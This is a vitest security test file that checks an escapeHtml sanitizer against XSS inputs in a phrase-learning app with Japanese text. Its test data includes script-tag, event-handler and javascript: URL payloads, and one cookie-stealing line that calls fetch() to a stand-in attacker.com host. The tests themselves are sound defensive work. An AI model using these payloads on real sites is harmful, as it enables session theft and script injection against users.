/**
 * Security Tests
 * Test cases for XSS prevention and input sanitization
 */

import { describe, it, expect } from 'vitest';
import { escapeHtml } from '../src/utils/sanitize.js';

describe('Security: XSS Prevention', () => {
  describe('escapeHtml function', () => {
    it('should escape script tags', () => {
      const malicious = '<script>alert("xss")</script>';
      const safe = escapeHtml(malicious);
      expect(safe).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
      expect(safe).not.toContain('<script>');
    });

    it('should escape event handler attributes', () => {
      const malicious = '<img src=x onerror="alert(1)">';
      const safe = escapeHtml(malicious);
      // Quotes are escaped, making the attribute value safe
      expect(safe).toContain('&quot;');
      expect(safe).toContain('&lt;img');
    });

    it('should escape onclick handlers', () => {
      const malicious = '<div onclick="steal()">Click me</div>';
      const safe = escapeHtml(malicious);
      // The tag is escaped, preventing execution
      expect(safe).toContain('&lt;div');
      expect(safe).toContain('&quot;');
    });

    it('should escape single and double quotes', () => {
      const malicious = '"><script>alert("xss")</script>';
      const safe = escapeHtml(malicious);
      expect(safe).toBe(
        '&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
      );
    });

    it('should escape ampersands to prevent entity injection', () => {
      const malicious = '&lt;iframe src="evil.com"&gt;';
      const safe = escapeHtml(malicious);
      expect(safe).toBe('&amp;lt;iframe src=&quot;evil.com&quot;&amp;gt;');
    });

    it('should handle empty string', () => {
      const safe = escapeHtml('');
      expect(safe).toBe('');
    });

    it('should handle null input', () => {
      const safe = escapeHtml(null);
      expect(safe).toBe('');
    });

    it('should handle undefined input', () => {
      const safe = escapeHtml(undefined);
      expect(safe).toBe('');
    });

    it('should handle non-string input', () => {
      const safe = escapeHtml(123);
      expect(safe).toBe('');
    });

    it('should not modify safe strings', () => {
      const safe = 'Hello, World! This is a safe string.';
      const escaped = escapeHtml(safe);
      expect(escaped).toBe(safe);
    });

    it('should escape mixed content correctly', () => {
      const mixed = 'Hello <script>alert("xss")</script> World';
      const safe = escapeHtml(mixed);
      expect(safe).toBe(
        'Hello &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; World'
      );
    });

    it('should handle Japanese text with HTML', () => {
      const mixed = '今日は<img src=x onerror="alert(1)">楽しかった';
      const safe = escapeHtml(mixed);
      expect(safe).toContain('&lt;img');
      expect(safe).toContain('今日は');
      expect(safe).toContain('楽しかった');
      expect(safe).not.toContain('<img');
    });

    it('should escape data URLs', () => {
      const dataUrl = '<img src="data:text/html,<script>alert(1)</script>">';
      const safe = escapeHtml(dataUrl);
      expect(safe).toContain('&lt;img');
      expect(safe).toContain('&lt;script');
      expect(safe).not.toContain('<script>');
    });

    it('should escape javascript: protocol', () => {
      const jsUrl = '<a href="javascript:alert(1)">Click</a>';
      const safe = escapeHtml(jsUrl);
      expect(safe).toContain('&lt;a');
      expect(safe).not.toContain('<a ');
    });
  });

  describe('XSS attack scenarios', () => {
    it('should prevent reflected XSS in narrative display', () => {
      const attackPayload =
        '"><script>fetch("https://attacker.com?cookie="+document.cookie)</script>';
      const escaped = escapeHtml(attackPayload);
      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
    });

    it('should prevent DOM-based XSS via data attributes', () => {
      const malicious = '" data-test="abc" onclick="alert(1)';
      const escaped = escapeHtml(malicious);
      // When placed in a data attribute, the quotes are escaped
      expect(escaped).toContain('&quot;');
      expect(escaped).toContain('&quot; data-test=');
    });

    it('should prevent stored XSS in key phrases', () => {
      const phrases = [
        {
          phrase_en: '<img src=x onerror="alert(1)">',
          meaning_ja: 'テスト',
          usage_hint_ja: 'ヒント',
        },
      ];
      const escapedPhrase = escapeHtml(phrases[0].phrase_en);
      expect(escapedPhrase).toContain('&lt;img');
      expect(escapedPhrase).not.toContain('<img');
    });

    it('should prevent XSS in alternative expressions', () => {
      const alternative = {
        original_en: 'hello<script>',
        alternative_en: '"><img src=x onerror="alert(1)">',
        nuance_ja: 'テスト',
      };
      const escaped = escapeHtml(alternative.alternative_en);
      expect(escaped).not.toContain('<img');
      expect(escaped).toContain('&lt;img');
    });
  });
});
